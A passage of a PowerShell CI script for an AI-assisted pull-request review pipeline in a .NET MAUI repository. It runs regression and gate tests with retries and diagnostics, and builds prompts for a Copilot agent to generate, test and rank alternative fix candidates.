                            $testExitCode = $LASTEXITCODE
                            $testOutput | Select-Object -Last 20 | ForEach-Object { Write-Host "    $_" }
                        } else {
                            Write-Host "    ⚠️ Run-DeviceTests.ps1 not found" -ForegroundColor Yellow
                            $testExitCode = -1
                        }
                    }
                    { $_ -eq 'UnitTest' -or $_ -eq 'XamlUnitTest' } {
                        if ($t.ProjectPath) {
                            $resolvedProj = Join-Path $RepoRoot $t.ProjectPath
                            Write-Host "    🧪 Running: dotnet test $($t.ProjectPath) --filter `"$($t.Filter)`"" -ForegroundColor Cyan
                            $testOutput = Invoke-WithoutGhTokens { dotnet test $resolvedProj --filter $t.Filter --logger "console;verbosity=minimal" 2>&1 }
                            $testExitCode = $LASTEXITCODE
                            $testOutput | Select-Object -Last 20 | ForEach-Object { Write-Host "    $_" }
                        } else {
                            Write-Host "    ⚠️ No project path for unit test" -ForegroundColor Yellow
                            $testExitCode = -1
                        }
                    }
                    default {
                        Write-Host "    ⚠️ Unknown test type: $($t.Type)" -ForegroundColor Yellow
                        $testExitCode = -1
                    }
                }

                if ($testExitCode -eq 0) {
                    Write-Host "    ✅ PASSED" -ForegroundColor Green
                    $regrTestPassed++
                    $regrTestDetails += @{ test = $t.TestName; fix_pr = $t.FixPR; type = $t.Type; result = 'PASSED' }
                } elseif ($testExitCode -eq -1) {
                    Write-Host "    ⏭️ SKIPPED" -ForegroundColor DarkGray
                    $regrTestSkipped++
                    $regrTestDetails += @{ test = $t.TestName; fix_pr = $t.FixPR; type = $t.Type; result = 'SKIPPED'; reason = 'Runner not available' }
                } else {
                    Write-Host "    ❌ FAILED (exit code: $testExitCode)" -ForegroundColor Red
                    $regrTestFailed++
                    $regrTestDetails += @{ test = $t.TestName; fix_pr = $t.FixPR; type = $t.Type; result = 'FAILED' }
                }
            } catch {
                Write-Host "    ⚠️ Error: $_" -ForegroundColor Yellow
                $regrTestSkipped++
                $regrTestDetails += @{ test = $t.TestName; fix_pr = $t.FixPR; type = $t.Type; result = 'ERROR'; reason = "$_" }
            }
        }

        # Determine overall result
        if ($regrTestFailed -gt 0) {
            $regressionTestResult = "FAILED"
            Write-Host "  🔴 Regression test result: $regrTestPassed passed, $regrTestFailed FAILED, $regrTestSkipped skipped" -ForegroundColor Red
        } elseif ($regrTestPassed -gt 0) {
            $regressionTestResult = "PASSED"
            Write-Host "  ✅ Regression test result: $regrTestPassed passed, $regrTestSkipped skipped" -ForegroundColor Green
        } else {
            $regressionTestResult = "SKIPPED"
            Write-Host "  ⏭️  All regression tests skipped ($regrTestSkipped total)" -ForegroundColor DarkGray
        }

        # Append results to regression-check content.md
        $regrContentFile = Join-Path $regressionOutputDir "content.md"
        if (Test-Path $regrContentFile) {
            $appendMd = New-Object System.Text.StringBuilder
            [void]$appendMd.AppendLine()
            [void]$appendMd.AppendLine("### 🧪 Regression Test Results")
            [void]$appendMd.AppendLine()
            $resultIcon = switch ($regressionTestResult) { "PASSED" { "✅" }; "FAILED" { "❌" }; default { "⏭️" } }
            [void]$appendMd.AppendLine("$resultIcon **$regressionTestResult** — $regrTestPassed passed, $regrTestFailed failed, $regrTestSkipped skipped")
            [void]$appendMd.AppendLine()
            if ($regrTestDetails.Count -gt 0) {
                [void]$appendMd.AppendLine("| Fix PR | Test | Type | Result |")
                [void]$appendMd.AppendLine("|---|---|---|---|")
                foreach ($d in $regrTestDetails) {
                    $icon = switch ($d.result) { "PASSED" { "✅" }; "FAILED" { "❌" }; default { "⏭️" } }
                    [void]$appendMd.AppendLine("| #$($d.fix_pr) | $($d.test) | $($d.type) | $icon $($d.result) |")
                }
            }
            Add-Content $regrContentFile $appendMd.ToString() -Encoding UTF8
        }

        # Write test results JSON
        @{
            result  = $regressionTestResult
            passed  = $regrTestPassed
            failed  = $regrTestFailed
            skipped = $regrTestSkipped
            details = $regrTestDetails
        } | ConvertTo-Json -Depth 4 | Set-Content (Join-Path $regrTestOutputDir "test-results.json") -Encoding UTF8
    }
}

# ═════════════════════════════════════════════════════════════════════════════
#  STEP 4: Gate - Test Before and After Fix (script, no copilot agent)
# ═════════════════════════════════════════════════════════════════════════════

# TEMP: Skip Gate (STEP 4) + Try-Fix (STEP 5) for fast iteration on the
# inline-stages architecture. Both phases are expensive (build the whole
# repo, run agents on multiple candidates) and we just need STEPs 1-3 +
# STEP 6 (post comment) to validate that detectedCategories /
# aiSummaryReviewId output variables flow through to the new
# RunDeepUITests + UpdateAISummaryComment stages. Flip $skipGateAndTryFix
# back to $false (or delete the wrapper) once the new pipeline stages
# are validated end-to-end.
$skipGateAndTryFix = $false
if (-not $skipGateAndTryFix) {

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
Write-Host "║  STEP 4: GATE — TEST VERIFICATION                         ║" -ForegroundColor Yellow
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Yellow

$gateOutputDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
New-Item -ItemType Directory -Force -Path $gateOutputDir | Out-Null

# Detect tests in PR
Write-Host "  🔍 Detecting tests in PR #$PRNumber..." -ForegroundColor Cyan
$testDetectScript = Join-Path $ScriptsDir "shared/Detect-TestsInDiff.ps1"
if (Test-Path $testDetectScript) {
    $testDetectScript = (Resolve-Path $testDetectScript).Path
    & pwsh -NoProfile -File $testDetectScript -PRNumber $PRNumber 2>&1 | ForEach-Object { Write-Host "    $_" }
} else {
    Write-Host "    ⚠️ Detect-TestsInDiff.ps1 not found at $testDetectScript" -ForegroundColor Yellow
}

# Determine platform for gate
$gatePlatform = if ($Platform) { $Platform } else { "android" }
Write-Host "  🧪 Running gate on platform: $gatePlatform" -ForegroundColor Cyan

$verifyScript = [System.IO.Path]::GetFullPath((Join-Path $SkillsDir "verify-tests-fail-without-fix/scripts/verify-tests-fail.ps1"))
if (-not (Test-Path $verifyScript)) {
    Write-Host "  ❌ verify-tests-fail.ps1 not found at: $verifyScript" -ForegroundColor Red
    # $gateExitCode = 1 ensures the switch at line ~561 produces $gateResult = "FAILED"
    $gateExitCode = 1
    $gateOutput = @("verify-tests-fail.ps1 not found at: $verifyScript")
} else {

$maxGateAttempts = 3
$gateExitCode = 1
$gateOutput = @()
# Path is fixed across attempts — define once, then clear per-iteration so a stale
# report from attempt N-1 can't be misclassified as the current attempt's output.
$gateContentFile = Join-Path $gateOutputDir "verify-tests-fail/verification-report.md"

for ($gateAttempt = 1; $gateAttempt -le $maxGateAttempts; $gateAttempt++) {
    if ($gateAttempt -gt 1) {
        Write-Host "  🔄 Retry $gateAttempt/$maxGateAttempts — previous attempt hit environment error" -ForegroundColor Yellow
    }
    if (-not $DryRun) {
        # Each verification attempt mutates fix files while testing the without-fix
        # state. If an attempt aborts before restoring those files, retries must
        # start from the committed review branch or they fail immediately with
        # "uncommitted changes detected in fix files".
        git checkout $reviewBranch 2>$null | Out-Null
        if ($LASTEXITCODE -ne 0) {
            Write-Error "Failed to checkout review branch '$reviewBranch' before gate attempt $gateAttempt."
            exit 1
        }
        git reset --hard HEAD 2>$null | Out-Null
        if ($LASTEXITCODE -ne 0) {
            Write-Error "Failed to reset review branch '$reviewBranch' before gate attempt $gateAttempt."
            exit 1
        }
        # `git reset --hard` above reverts the worktree's .github to the (possibly stale) PR
        # branch copies, so re-apply the trusted, branch-aware infra scripts before the verify
        # script invokes the worktree's Run-DeviceTests.ps1 / BuildAndRunHostApp.ps1.
        Restore-TrustedScripts -TrustedScriptsDir $TrustedScriptsDir -RepoRoot $RepoRoot
    }
    # Clear previous attempt's report so a crash mid-run doesn't leak its classification into this one.
    Remove-Item $gateContentFile -Force -ErrorAction SilentlyContinue
    # Note: -RequireFullVerification is intentionally OMITTED. The verify script
    # auto-detects fix files from the diff; if there are none (e.g., a test-only
    # PR like a regression repro), it falls back to "verify failure only" mode
    # and reports whether the new tests fail without any fix. Passing the flag
    # would force the script to error out for those PRs.
    # Note: NOT wrapped in Invoke-WithoutGhTokens here — verify-tests-fail.ps1
    # itself needs GH_TOKEN to invoke Detect-TestsInDiff.ps1 (which calls `gh api`
    # to enumerate PR files). The script wraps its OWN dotnet/host-app/device-test
    # subprocess invocations internally to strip the token before PR code runs.
    $gateOutput = & pwsh -NoProfile -File "$verifyScript" -Platform $gatePlatform -PRNumber $PRNumber 2>&1
    $gateExitCode = $LASTEXITCODE
    $gateOutput | ForEach-Object { Write-Host "    $_" }

    # Check if this was an ENV ERROR (emulator timeout, ADB failure, etc.)
    $isEnvError = $false
    if ($gateExitCode -ne 0) {
        if (Test-Path $gateContentFile) {
            $gateContent = Get-Content $gateContentFile -Raw -ErrorAction SilentlyContinue
            if ($gateContent -match 'ENV ERROR') {
                $isEnvError = $true
                Write-Host "  ⚠️ Environment error detected (attempt $gateAttempt/$maxGateAttempts)" -ForegroundColor Yellow
            }
        } else {
            # Verify script crashed BEFORE writing the report (e.g., emulator failed to
            # start, ADB crash during setup, OOM kill). The most severe infra failures
            # never reach the report-writing path, so a missing report alongside a
            # non-zero exit is itself a strong signal we should retry rather than break.
            $isEnvError = $true
            Write-Host "  ⚠️ Verification report missing after non-zero exit — treating as infra failure (attempt $gateAttempt/$maxGateAttempts)" -ForegroundColor Yellow
        }
    }

    if ($gateExitCode -eq 0 -or -not $isEnvError) {
        break  # Real pass or real failure — don't retry
    }
    if ($gateAttempt -lt $maxGateAttempts) {
        Write-Host "  ⏳ Waiting 30s before retry..." -ForegroundColor DarkGray
        Start-Sleep -Seconds 30
    }
}
if ($isEnvError) {
    # Reachable only if EVERY iteration was an env error: real pass/fail
    # iterations `break` out of the loop (so $isEnvError would be reset to $false
    # at the top of the next iteration but we'd never get here). $isEnvError
    # here means "all $maxGateAttempts attempts hit env errors" — not "any".
    Write-Host "  ⚠️ All $maxGateAttempts gate attempts hit environment errors" -ForegroundColor Yellow
    # Persistent env error = the gate could not verify anything. Report INCONCLUSIVE
    # (exit 3) rather than letting it fall through to FAILED, so infra flakes don't
    # masquerade as a broken fix.
    $gateExitCode = 3
}

} # end else (verify script exists)

# Exit code: 0 = passed, 1 = verification failed, 2 = no tests detected, 3 = inconclusive (build/env error)
$gateResult = switch ($gateExitCode) {
    0 { "PASSED" }
    2 { "SKIPPED" }
    3 { "INCONCLUSIVE" }
    default { "FAILED" }
}
$gateColor = switch ($gateResult) { "PASSED" { "Green" } "SKIPPED" { "Yellow" } "INCONCLUSIVE" { "Yellow" } default { "Red" } }
Write-Host "  📁 Gate result: $gateResult" -ForegroundColor $gateColor

# Copy the verification report to gate/content.md (always overwrite — the report is the source of truth)
$verificationReport = Join-Path $gateOutputDir "verify-tests-fail/verification-report.md"
# Capture last meaningful lines from gate output for fallback diagnostics
$gateLogTail = @($gateOutput | ForEach-Object { $_.ToString() } | Where-Object { $_ -match '\S' } | Select-Object -Last 60) -join "`n"

# ─── Improvement #1: build rich fallback diagnostics for the silent-failure case ───
# When verify-tests-fail.ps1 aborts before writing its report, the original fallback
# emitted just "Gate Result: FAILED" + an empty <details> block. Capture extra signal
# so reviewers and downstream agents can act on it.
function Get-GateFallbackDetails {
    param([string]$Tail, [int]$ExitCode, [string]$VerifyDir, [string]$ReviewedPlatform)

    $sections = @()

    $sections += "**Exit code:** ``$ExitCode``"

    # Surface auto-detected tests / fix files from the verify script's stdout
    # so reviewers can tell whether detection failed vs. the test run itself.
    $detected = @{}
    foreach ($line in ($Tail -split "`n")) {
        if ($line -match '^\s*Detected test type:\s*(\S+)') { $detected['type'] = $Matches[1] }
        elseif ($line -match '^\s*Test filter:\s*(\S+)')      { $detected['filter'] = $Matches[1] }
        elseif ($line -match '^\s*Fix files \((\d+)\):')      { $detected['fixCount'] = $Matches[1] }
        elseif ($line -match '^\s*Merge base:\s*(\S+)')       { $detected['mergeBase'] = $Matches[1] }
    }
    if ($detected.Count -gt 0) {
        $items = @()
        if ($detected.ContainsKey('type'))      { $items += "- Test type: ``$($detected['type'])``" }
        if ($detected.ContainsKey('filter'))    { $items += "- Test filter: ``$($detected['filter'])``" }
        if ($detected.ContainsKey('fixCount')) { $items += "- Fix files detected: $($detected['fixCount'])" }
        if ($detected.ContainsKey('mergeBase')) { $items += "- Merge base: ``$($detected['mergeBase'])``" }
        $sections += "**Auto-detected:**`n" + ($items -join "`n")
    }

    # Heuristic classification — make the cause actionable instead of leaving the
    # reader to grep stderr.
    $likely = @()
    if ($Tail -match '(?i)Could not auto-detect PR number|no tests detected|0 test\(s\) detected') {
        $likely += "Test detection failed — no runnable tests were found in the PR diff."
    }
    # Match coded build errors (CS, MSB, NU, MAUI, NETSDK, XA, etc.) without false-positiving
    # on lines like "MSBUILD output: 0 error(s)". The general form `error <ABBR><NNNN>` covers
    # compiler, MSBuild, NuGet restore, MAUI analyzer, .NET SDK, Android packaging diagnostics.
    if ($Tail -match '(?i)build failed|\berror\s+[A-Z]{2,}\d+\b') {
        $likely += "Build error before any test could run."
    }
    if ($Tail -match '(?i)emulator.*(?:timeout|failed|not.found)|adb.*(?:server|crashed)|xharness.*(?:failed|timeout)') {
        $likely += "Device/emulator setup failed (env error class)."
    }
    if ($Tail -match '(?i)merge.conflict|conflict.*merge.base') {
        $likely += "Merge conflict prevented running the gate."
    }
    if ($Tail -match '(?i)NO FIX FILES DETECTED') {
        $likely += "No fix files detected in the diff (PR may be test-only — should now run in failure-only mode)."
    }
    if ($likely.Count -gt 0) {
        $sections += "**Likely cause:**`n" + (($likely | ForEach-Object { "- $_" }) -join "`n")
    }

    # List artifacts under gate/verify-tests-fail/ — partial logs sometimes survive
    # even when the report itself was not written.
    if (Test-Path $VerifyDir) {
        $files = Get-ChildItem -Path $VerifyDir -File -ErrorAction SilentlyContinue |
            Sort-Object Name | ForEach-Object { "- ``$($_.Name)`` ($([math]::Round($_.Length / 1KB, 1)) KB)" }
        if ($files) {
            $sections += "**Artifacts written before exit:**`n" + ($files -join "`n")
        }
    }

    return ($sections -join "`n`n")
}

if (Test-Path $verificationReport) {
    $reportContent = Get-Content $verificationReport -Raw -ErrorAction SilentlyContinue
    if ($reportContent) {
        # Strip broken "Test Summary" blocks with empty values (from old verify script format)
        $reportContent = $reportContent -replace '(?s)\*\*Test Summary:\*\*\s*\n- Total:\s*\n- Passed:\s*(True|False)\s*\n- Failed:\s*\n- Skipped:\s*\n?', ''
        $reportContent | Set-Content (Join-Path $gateOutputDir "content.md") -Encoding UTF8
    } else {
        # Report exists but has bad format — generate fallback with logs
        Write-Host "  ⚠️ Verification report has invalid format — using fallback" -ForegroundColor Yellow
        $resultIcon = switch ($gateResult) { "PASSED" { "✅" } "SKIPPED" { "⚠️" } "INCONCLUSIVE" { "⚠️" } default { "❌" } }
        $fallbackDetails = Get-GateFallbackDetails -Tail $gateLogTail -ExitCode $gateExitCode -VerifyDir (Join-Path $gateOutputDir "verify-tests-fail") -ReviewedPlatform $gatePlatform
        @"
### Gate Result: $resultIcon $gateResult

**Platform:** $($gatePlatform.ToUpper())

> ⚠️ ``verify-tests-fail.ps1`` produced an empty report. Diagnostics below.

$fallbackDetails

<details>
<summary>Gate output log (last 60 lines)</summary>

``````
$gateLogTail
``````

</details>
"@ | Set-Content (Join-Path $gateOutputDir "content.md") -Encoding UTF8
    }
} elseif (-not (Test-Path (Join-Path $gateOutputDir "content.md"))) {
    if ($gateResult -eq "SKIPPED") {
        @"
### Gate Result: ⚠️ SKIPPED

No tests were detected in this PR.

**Recommendation:** Add tests to verify the fix using the ``write-tests-agent``.
"@ | Set-Content (Join-Path $gateOutputDir "content.md") -Encoding UTF8
    } else {
        $resultIcon = switch ($gateResult) { "PASSED" { "✅" } "INCONCLUSIVE" { "⚠️" } default { "❌" } }
        $fallbackDetails = Get-GateFallbackDetails -Tail $gateLogTail -ExitCode $gateExitCode -VerifyDir (Join-Path $gateOutputDir "verify-tests-fail") -ReviewedPlatform $gatePlatform
        @"
### Gate Result: $resultIcon $gateResult

**Platform:** $($gatePlatform.ToUpper())

> ⚠️ ``verify-tests-fail.ps1`` exited before writing a verification report. Diagnostics below.

$fallbackDetails

<details>
<summary>Gate output log (last 60 lines)</summary>

``````
$gateLogTail
``````

</details>
"@ | Set-Content (Join-Path $gateOutputDir "content.md") -Encoding UTF8
    }
}

# Persist gate result so other phases can read it
$gateVerdictDir = if ($TrustedScriptsDir) {
    Split-Path $TrustedScriptsDir -Parent
} else {
    $d = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
    New-Item -ItemType Directory -Force -Path $d | Out-Null
    $d
}
$gateResult | Set-Content (Join-Path $gateVerdictDir "gate-result.txt") -Encoding UTF8
# Also persist into PRAgent/gate, which ships in the CopilotLogs artifact. This copy is used
# only for DISPLAY (the gate label and the rendered gate section) — it is NOT trusted for the
# APPROVE veto. The veto keys off the trusted Gate-task output variable (RunGate.gateResult),
# captured from the staging-root copy above before the untrusted CopilotReview phase runs, so a
# later overwrite of this artifact copy cannot bypass the veto.
$gateResult | Set-Content (Join-Path $gateOutputDir "gate-result.txt") -Encoding UTF8
Write-Host "  📄 Gate result persisted: $gateResult" -ForegroundColor Gray

# Persist regression data for CopilotReview phase (try-fix instructions)
if ($risksData) {
    try {
        $risksData | ConvertTo-Json -Depth 10 -Compress | Set-Content (Join-Path $gateVerdictDir "regression-risks.json") -Encoding UTF8
        if ($regressionTests -and $regressionTests.Count -gt 0) {
            @($regressionTests) | ConvertTo-Json -Depth 5 -Compress | Set-Content (Join-Path $gateVerdictDir "regression-tests.json") -Encoding UTF8
        }
        if ($regrPlatform) {
            $regrPlatform | Set-Content (Join-Path $gateVerdictDir "regression-platform.txt") -Encoding UTF8
        }
        Write-Host "  📄 Regression data persisted" -ForegroundColor Gray
    } catch {
        Write-Host "  ⚠️ Failed to persist regression data (non-fatal): $_" -ForegroundColor Yellow
    }
}

# Persist detect script path and detected categories for Tier 3 refresh
if ($detectScript) {
    $detectScript | Set-Content (Join-Path $gateVerdictDir "detect-script-path.txt") -Encoding UTF8
}
$uitestCategories | Set-Content (Join-Path $gateVerdictDir "uitest-categories.txt") -Encoding UTF8

} # end if (-not $skipGateAndTryFix)

} # end if ($runGate)

# In phased CI mode the Gate step's process exit code drives the GateFailed pipeline
# variable (eng/pipelines/ci-copilot.yml "Check Review Result"). Make that explicit and
# verdict-driven: only a genuine FAILED gate blocks the PR. PASSED / SKIPPED (no tests) /
# INCONCLUSIVE (build or environment error — the gate could not verify anything) must NOT
# block, so they exit 0. This stops infra/build flakes from masquerading as a failing fix.
if ($runGate -and $Phase -eq 'Gate') {
    if ($LogFile) { Stop-Transcript -ErrorAction SilentlyContinue | Out-Null }
    if ($gateResult -eq 'FAILED') {
        Write-Host "  ⛔ Gate verdict FAILED — signaling blocking exit (1)" -ForegroundColor Red
        exit 1
    }
    Write-Host "  ✅ Gate verdict '$gateResult' is non-blocking — exit 0" -ForegroundColor Green
    exit 0
}

# ─── Phase: CopilotReview ──────────────────────────────────────────────────
if ($runCopilotReview) {

# Restore gate result from file when running in phased mode
if ($Phase -eq 'CopilotReview') {
    $gateVerdictDir = if ($TrustedScriptsDir) {
        Split-Path $TrustedScriptsDir -Parent
    } else {
        Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
    }
    $gateVerdictFile = Join-Path $gateVerdictDir "gate-result.txt"
    if (Test-Path $gateVerdictFile) {
        $gateResult = (Get-Content $gateVerdictFile -Raw).Trim()
        Write-Host "  📄 Restored gate result: $gateResult" -ForegroundColor Gray
    } else {
        $gateResult = "SKIPPED"
        Write-Host "  ⚠️ Gate result file not found — defaulting to SKIPPED" -ForegroundColor Yellow
    }

    # Restore regression data persisted by Gate phase
    $risksFile = Join-Path $gateVerdictDir "regression-risks.json"
    $testsFile = Join-Path $gateVerdictDir "regression-tests.json"
    $platFile  = Join-Path $gateVerdictDir "regression-platform.txt"
    if (Test-Path $risksFile) {
        try {
            $risksData = Get-Content $risksFile -Raw -Encoding UTF8 | ConvertFrom-Json
            if (Test-Path $testsFile) {
                $regressionTests = @(Get-Content $testsFile -Raw -Encoding UTF8 | ConvertFrom-Json)
            }
            if (Test-Path $platFile) {
                $regrPlatform = (Get-Content $platFile -Raw).Trim()
            } else {
                $regrPlatform = if ($Platform) { $Platform } else { "android" }
            }
            Write-Host "  📄 Restored regression data ($($regressionTests.Count) tests)" -ForegroundColor Gray
        } catch {
            Write-Host "  ⚠️ Failed to restore regression data (non-fatal): $_" -ForegroundColor Yellow
        }
    }

    # Restore detect script path and UI test categories for Tier 3 refresh
    $detectPathFile = Join-Path $gateVerdictDir "detect-script-path.txt"
    $catsFile       = Join-Path $gateVerdictDir "uitest-categories.txt"
    if (Test-Path $detectPathFile) {
        $detectScript = (Get-Content $detectPathFile -Raw).Trim()
    }
    if (Test-Path $catsFile) {
        $uitestCategories = (Get-Content $catsFile -Raw).Trim()
    }
}

# Restore review branch
git checkout $reviewBranch 2>$null | Out-Null

# ═════════════════════════════════════════════════════════════════════════════
#  STEP 5: PR Review (3-phase skill: Pre-Flight, Try-Fix, Report)
# ═════════════════════════════════════════════════════════════════════════════

$gateStatusForPrompt = switch ($gateResult) {
    "PASSED" { "Gate ✅ PASSED — tests FAIL without fix, PASS with fix." }
    "SKIPPED" { "Gate ⚠️ SKIPPED — no tests detected in this PR. Consider suggesting the author add tests." }
    "INCONCLUSIVE" { "Gate ⚠️ INCONCLUSIVE — the tests could not be built/run (build or environment error), so the fix is UNVERIFIED. Do NOT treat this as a failing fix and do NOT request changes solely because of the gate; review the code on its merits." }
    default { "Gate ❌ FAILED — tests did NOT behave as expected." }
}

# Build regression test instruction for try-fix candidates
$regressionTestInstruction = ""
if ($risksData -and $regressionTests -and $regressionTests.Count -gt 0) {
    $testLines = @()
    foreach ($t in $regressionTests) {
        switch ($t.Type) {
            'UITest'       { $testLines += "  - ``BuildAndRunHostApp.ps1 -Platform $regrPlatform -TestFilter `"$($t.Filter)`"`` (UITest from fix PR #$($t.FixPR))" }
            'DeviceTest'   { $proj = if ($t.Project) { $t.Project } else { 'Controls' }; $testLines += "  - ``Run-DeviceTests.ps1 -Project $proj -Platform $regrPlatform -TestFilter `"$($t.Filter)`"`` (DeviceTest from fix PR #$($t.FixPR))" }
            'UnitTest'     { if ($t.ProjectPath) { $testLines += "  - ``dotnet test $($t.ProjectPath) --filter `"$($t.Filter)`"`` (UnitTest from fix PR #$($t.FixPR))" } }
            'XamlUnitTest' { if ($t.ProjectPath) { $testLines += "  - ``dotnet test $($t.ProjectPath) --filter `"$($t.Filter)`"`` (XamlUnitTest from fix PR #$($t.FixPR))" } }
        }
    }
    if ($testLines.Count -gt 0) {
        $regressionTestInstruction = @"

## 🔴 REGRESSION TESTS (MANDATORY for every candidate)

The regression cross-reference detected that this PR modifies files touched by prior bug-fix PRs. **Every try-fix candidate MUST run these additional tests** after its own test command passes. A candidate that passes its own tests but FAILS a regression test should be marked as ``Fail``.

$($testLines -join "`n")

Run these AFTER your primary test command succeeds. If any regression test fails, your candidate is ``Fail`` — the fix re-introduces a previously fixed bug.
"@
    }
}

# ── STEP 5a: Try-Fix — iterative candidate generation (Copilot call 1) ────
$step5aPrompt = @"
Generate alternative fix candidates for PR #$PRNumber using an iterative expert-review-and-test loop.

## Phase 1 — Pre-Flight (context only)
Use the pr-review skill's pre-flight phase to gather context about the issue and PR. Do NOT modify code.
Write summary to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/pre-flight/content.md``.

## Phase 2 — Iterative Try-Fix loop
For each candidate, follow this cycle:

1. **Generate** — Use the code-review skill with the maui-expert-reviewer agent to analyze the problem and generate a fix candidate. Each candidate must explore a DIFFERENT approach from the PR's current fix and from previous candidates. The expert reviewer provides domain-specific guidance for MAUI (handlers, platform specifics, layout, etc.).
2. **Test** — Run the candidate against the gate criteria and regression tests. Record pass/fail.
3. **Learn** — If the candidate failed, feed the failure details (test output, error messages) back to the expert reviewer to inform the next candidate.
4. **Repeat or stop** — Generate the next candidate incorporating lessons from failures. Stop when:
   - A candidate passes ALL tests and is demonstrably better than the PR's fix, OR
   - You've exhausted meaningfully different approaches (don't generate trivial variations)

Number candidates sequentially (``try-fix-1``, ``try-fix-2``, ``try-fix-3``, ...).

For each candidate:
- Write output to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/try-fix-{N}/content.md``
- Include: approach description, diff, test results, failure analysis (if failed)

Aggregate all try-fix narrative to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/try-fix/content.md``.
$regressionTestInstruction

$platformInstruction
$autonomousRules

**Gate result (already completed in a prior step):** $gateStatusForPrompt
Do NOT re-run gate verification. The gate phase is handled separately.
⚠️ Do NOT create or overwrite ``gate/content.md`` — it is already generated by the gate script with detailed test output.
"@

Invoke-CopilotStep -StepName "STEP 5a: TRY-FIX" -Prompt $step5aPrompt | Out-Null

# Restore review branch between copilot calls
git checkout $reviewBranch 2>$null | Out-Null

# Diagnostic: check what STEP 5a produced
Write-Host ""
Write-Host "  📊 STEP 5a output check:" -ForegroundColor Cyan
$tryFixDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent"
$tryFixContent = Join-Path $tryFixDir "try-fix/content.md"
$preFlightContent = Join-Path $tryFixDir "pre-flight/content.md"
if (Test-Path $preFlightContent) {
    $pfSize = (Get-Item $preFlightContent).Length
    Write-Host "    ✅ pre-flight/content.md ($pfSize bytes)" -ForegroundColor Green
} else {
    Write-Host "    ❌ pre-flight/content.md MISSING" -ForegroundColor Red
}
if (Test-Path $tryFixContent) {
    $tfSize = (Get-Item $tryFixContent).Length
    Write-Host "    ✅ try-fix/content.md ($tfSize bytes)" -ForegroundColor Green
} else {
    Write-Host "    ⚠️ try-fix/content.md not found (agent may not have written it)" -ForegroundColor Yellow
}
$tryFixDirs = Get-ChildItem -Path $tryFixDir -Directory -Filter "try-fix-*" -ErrorAction SilentlyContinue
if ($tryFixDirs) {
    Write-Host "    📁 Try-fix candidates: $($tryFixDirs.Count) ($($tryFixDirs.Name -join ', '))" -ForegroundColor Cyan
} else {
    Write-Host "    ⚠️ No try-fix-N directories found" -ForegroundColor Yellow
}

# ── STEP 5b: Expert Review of PR fix + final comparison (Copilot call 2) ──
# Current PR metadata for the pr-finalize (Phase 4) evaluate-first / preserve-quality step.
# Prefer the pr-metadata.json the Setup phase persisted (gh works there and $prInfo is
# populated); `gh pr view` is unreliable in this CopilotReview phase after the squash-merge
# checkout. Fall back to a fresh gh fetch, then $prInfo, then non-degrading guidance text.
$prCurrentTitle = $null
$prCurrentBody = $null
$prMetaDir = if ($TrustedScriptsDir) { Split-Path $TrustedScriptsDir -Parent } else { Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate" }
$prMetaPath = Join-Path $prMetaDir "pr-metadata.json"
if (Test-Path $prMetaPath) {
    try {
        $prMetaFromFile = Get-Content -Raw $prMetaPath | ConvertFrom-Json
        if ($prMetaFromFile.title) { $prCurrentTitle = [string]$prMetaFromFile.title }
        if ($prMetaFromFile.body)  { $prCurrentBody = [string]$prMetaFromFile.body }
    } catch { Write-Host "  ⚠️ Could not read pr-metadata.json: $($_.Exception.Message)" -ForegroundColor Yellow }
}
if (-not $prCurrentTitle -or -not $prCurrentBody) {
    $prMeta = gh pr view $PRNumber --json title,body 2>$null | ConvertFrom-Json
    if (-not $prMeta) { $prMeta = $prInfo }
    if (-not $prCurrentTitle -and $prMeta -and $prMeta.title) { $prCurrentTitle = [string]$prMeta.title }
    if (-not $prCurrentBody -and $prMeta -and $prMeta.body) { $prCurrentBody = [string]$prMeta.body }
}
if (-not $prCurrentTitle) { $prCurrentTitle = '(unknown — could not fetch; do not assume it is missing)' }
if (-not $prCurrentBody) { $prCurrentBody = '(could not fetch description — evaluate against the diff; do not assume the PR has no description)' }
if ($prCurrentBody.Length -gt 4000) { $prCurrentBody = $prCurrentBody.Substring(0, 4000) + "`n...(description truncated for prompt)..." }
$step5bPrompt = @"
Run expert code review of PR #$PRNumber's fix and compare against all try-fix candidates from STEP 5a.

Read context from:
- ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/pre-flight/content.md``
- ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/try-fix/content.md`` (and individual try-fix-{N}/content.md files)

## Phase 1 — Expert reviewer evaluation of the PR fix
Use the code-review skill with the maui-expert-reviewer agent to evaluate the PR's existing fix. Apply the reviewer's actionable feedback in a sandbox copy and treat the result as a candidate named ``pr-plus-reviewer``.
- Always also write the raw inline findings to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/inline-findings.json`` (these are file:line findings against the PR's diff and feed the inline-comment posting step).
- Write candidate output to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/expert-pr-eval/content.md``.

## Phase 2 — Comparative Report
Compare ALL candidates:
- ``pr`` (the raw PR fix as submitted)
- ``pr-plus-reviewer`` (PR fix + expert reviewer feedback applied)
- All ``try-fix-N`` candidates from STEP 5a
Pick the single winning candidate. **Candidates that failed regression tests MUST be ranked lower than candidates that passed them.**
Write the comparative analysis to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/report/content.md``.

## Phase 3 — Winner manifest (REQUIRED)
Write ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/winner.json`` with this exact schema:
``````json
{
  "schemaVersion": 1,
  "winner": "pr" | "pr-plus-reviewer" | "try-fix-N",
  "isPRFix": true | false,
  "summary": "1-3 sentence rationale for why this candidate won",
  "candidateDiff": "<unified diff against PR base — REQUIRED when isPRFix is false; empty string when isPRFix is true>"
}
``````
Rules:
- ``isPRFix`` MUST be ``true`` when ``winner`` is ``pr`` or ``pr-plus-reviewer``.
- ``isPRFix`` MUST be ``false`` when ``winner`` is any ``try-fix-*``.
